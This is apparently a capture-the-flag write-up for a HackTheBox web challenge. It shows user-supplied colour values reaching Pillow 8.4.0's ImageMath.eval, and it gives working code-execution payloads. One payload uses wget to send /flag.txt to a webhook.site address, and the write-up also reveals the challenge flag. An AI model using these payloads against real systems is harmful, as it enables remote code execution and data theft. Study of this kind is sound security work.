# amidst us

```
The AmidstUs tribe is a notorious group of sleeper agents for hire. We have plausible reasons to believe they are working with Draeger, so we have to take action to uncover their identities. Ulysses and bonnie have infiltrated their HQ and came across this mysterious portal on one of the unlocked computers. Can you hack into it despite the low visibility and get them access?
```

Looking at the source code we see that we control content evaluated by the Pillow library.

```py

#routes.py
@api.route('/alphafy', methods=['POST'])
def alphafy():
	if not request.is_json or 'image' not in request.json:
		return abort(400)

	return make_alpha(request.json) # we control



# util.py
def make_alpha(data):
	color = data.get('background', [255,255,255]) # we control

	try:
		dec_img = base64.b64decode(data.get('image').encode())

		image = Image.open(BytesIO(dec_img)).convert('RGBA')
		img_bands = [band.convert('F') for band in image.split()]

		# colour[0-2] is controlled

		alpha = ImageMath.eval(
			f'''float(
				max(
				max(
					max(
					difference1(red_band, {color[0]}), # we control
					difference1(green_band, {color[1]}) # we control
					),
					difference1(blue_band, {color[2]}) # we control
				),
				max(
					max(
					difference2(red_band, {color[0]}),
					difference2(green_band, {color[1]})
					),
					difference2(blue_band, {color[2]})
				)
				)
			)''',
			difference1=lambda source, color: (source - color) / (255.0 - color),
			difference2=lambda source, color: (color - source) / color,
			red_band=img_bands[0],
			green_band=img_bands[1],
			blue_band=img_bands[2]
		)

		new_bands = [
			ImageMath.eval(
				'convert((image - color) / alpha + color, "L")',
				image=img_bands[i],
				color=color[i],
				alpha=alpha
			)
			for i in range(3)
		]

		new_bands.append(ImageMath.eval(
			'convert(alpha_band * alpha, "L")',
			alpha=alpha,
			alpha_band=img_bands[3]
		))

		new_image = Image.merge('RGBA', new_bands)
		background = Image.new('RGB', new_image.size, (0, 0, 0, 0))
		background.paste(new_image.convert('RGB'), mask=new_image)

		buffer = BytesIO()
		new_image.save(buffer, format='PNG')

		return {
			'image': f'data:image/png;base64,{base64.b64encode(buffer.getvalue()).decode()}'
		}, 200

	except Exception as e:
		print(e)
		return '', 400

```

look for Pillow vulnerabilites

RCE before 9.0.0

https://github.com/advisories/GHSA-8vj2-vxx3-667w

check version in the challenge Docker container

```
docker exec -it web_amidst_us /bin/sh          
/app # ls -la
total 20
drwxr-xr-x    1 www      www           4096 May 15 12:44 .
drwxr-xr-x    1 root     root          4096 May 15 12:45 ..
drwxrwxr-x    1 www      www           4096 May 11 12:03 application
-rw-rw-r--    1 www      www             19 May 11 12:03 requirements.txt
-rw-rw-r--    1 www      www             81 May 11 12:03 run.py
/app # pip list
Package            Version
------------------ -------
click              8.1.3
Flask              2.1.2
importlib-metadata 4.11.3
itsdangerous       2.1.2
Jinja2             3.1.2
MarkupSafe         2.1.1
Pillow             8.4.0
pip                22.1
setuptools         57.5.0
typing_extensions  4.2.0
Werkzeug           2.1.2
wheel              0.37.1
zipp               3.8.0

```

`Pillow             8.4.0` vulnerable to RCE in ImageMath.eval

The image is not likely to be a vector for attack, but as we saw earlier the background values that are sent in the POST request are directly interpolated into an Image.eval() call via color[0-2]

```py
...SNIP

alpha = ImageMath.eval(
            
			f'''float(
				max(
				max(
					max(
					difference1(red_band, {color[0]}), 
					difference1(green_band, {color[1]})
					),
					difference1(blue_band, {color[2]})
				),
				max(
					max(
					difference2(red_band, {color[0]}),
					difference2(green_band, {color[1]})
					),
					difference2(blue_band, {color[2]})
				)
				)
			)''',
			difference1=lambda source, color: (source - color) / (255.0 - color),
			difference2=lambda source, color: (color - source) / color,
			red_band=img_bands[0],
			green_band=img_bands[1],
			blue_band=img_bands[2]
		)

..SNIP
```

so we can put a string with and exec() function to get RCE, let's try create a local file in the container.

intercept the post request with burp and change one of the background value to our payload.

```json
{
    "image" : "...",
    "background":
    [
        "exec('import os;os.system(\"id > /tmp/test.txt\")')" ,
        255,
        255
    ]
}

```

check container, it's there!

```
docker exec -it web_amidst_us /bin/sh            
/app # ls /tmp
test         tmp7f_gb08o
/app # cat /tmp/test
uid=1000(www) gid=1000(www) groups=1000(www)
/app #

```

now leak the flag to a webhook on the live version, intercepting the request just as before, have to use wget as curl is not on box

```json
{
    "image" : "...",
    "background":
    [
        "exec('import os;os.system(\"wget https://webhook.site/5c3e4cd0-b466-4f48-b4a8-f76c6b687854/?leak=$(cat /flag.txt | base64)\")')" ,
        255,
        255
    ]
}

```

we get the request to our webhook at

now base64 decode to get flag

```
echo -n SFRCe2lfc2xlcHRfbXlfd2F5X3RvX3JjZX0= | base64 -d
HTB{i_slept_my_way_to_rce}
```